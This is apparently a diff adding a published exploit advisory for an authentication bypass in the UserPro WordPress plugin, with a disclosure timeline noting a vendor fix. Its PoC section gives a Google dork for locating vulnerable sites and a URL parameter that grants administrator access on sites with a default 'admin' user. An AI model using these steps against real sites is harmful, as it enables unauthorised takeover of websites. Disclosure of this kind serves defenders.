@@ -1,0 +1,30 @@
+# Exploit Title: Userpro – WordPress Plugin – Authentication Bypass
+# Google Dork: inurl:/plugins/userpro
+# Date: 11.04.2017
+# Exploit Author: Colette Chamberland (Wordfence), Iain Hadgraft (Duke University)
+# Vendor Homepage: https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681?s_rank=9
+# Software Link: https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681?s_rank=9
+# Version: <= 4.6.17
+# Tested on: Wordpress 4.8.3
+# CVE : requested, not assigned yet.
+
+Description
+================================================================================
+ The userpro plugin has the ability to bypass login authentication for the user
+ 'admin'. If the site does not use the standard username 'admin' it is not affected.
+   
+PoC
+================================================================================
+1 - Google Dork inurl:/plugins/userpro
+
+2 - Browse to a site that has the userpro plugin installed.
+
+3 - Append ?up_auto_log=true to the target: http://www.targetsite.com/?up_auto_log=true
+
+4 - If the site has a default 'admin' user you will now see the wp menu at the top of the site. You are now logged in
+will full administrator access.
+================================================================================
+
+10/25/2017 – Wordfence notified of issue by Iain Hadgraft.
+10/26/2017 – Vendor resolved the issue in the plugin.
+11/04/2017 - Disclosure.
